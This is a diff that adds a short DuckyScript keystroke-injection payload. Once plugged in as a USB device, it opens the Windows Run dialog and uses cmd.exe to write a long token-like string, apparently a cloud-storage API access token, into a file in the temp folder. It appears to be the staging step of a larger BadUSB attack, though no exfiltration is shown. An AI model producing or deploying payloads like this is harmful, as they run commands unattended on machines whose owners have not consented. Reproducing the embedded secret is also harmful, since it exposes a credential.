@@ -1,0 +1,6 @@
+DUCKY_LANG DA
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd.exe /c echo sl.Bnhk89ms_6QQ9TggE9hiBrV0PQHQhHHa_Ev25zYkTGaOFFRzz69ZWD-qmzofvkqPc7fynN3l4G6e1-20mPfxRvctp6Vg_n4UzidIzxyo9Yog75IQA1DulrYisBH5oVU5zFr1GoQ5fOk3OeE > %temp%\at.txt
+ENTER
